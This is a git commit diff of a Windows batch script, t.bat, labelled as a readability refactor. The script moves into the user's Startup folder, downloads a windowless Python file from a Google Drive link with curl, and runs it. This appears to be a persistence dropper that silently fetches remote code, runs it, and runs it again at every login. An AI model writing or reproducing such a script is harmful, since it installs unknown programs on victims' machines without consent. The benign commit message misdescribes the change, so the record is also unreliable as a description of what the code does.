b8f031af971d43a718deaf012b32433e3c0815c0
oogabooga245 <68644080+oogabooga245@users.noreply.github.com>
2026-07-28 16:21:04 -0400

    Refactor t.bat for improved readability

--- t.bat
+++ t.bat
@@ -16,10 +16,9 @@ cd /d "%startupFolder%"
 rem Display the current directory to confirm
 echo You are now in the Startup folder:
 curl -o t.pyw https://drive.usercontent.google.com/download?id=1gC89KsuuYYsGoVJKko68uwO-O2Cjteaa&export=download&authuser=0&confirm=t&uuid=7de8c40b-466f-49f3-8b2e-5440df5fd235&at=ABswASZvXrV3Emqz4ojvYM7N1cH6:1785267897992
-
+start t.pyw
 
 rem Optional: list the contents of the Startup folder
 dir
 
-start t.pyw
 exit
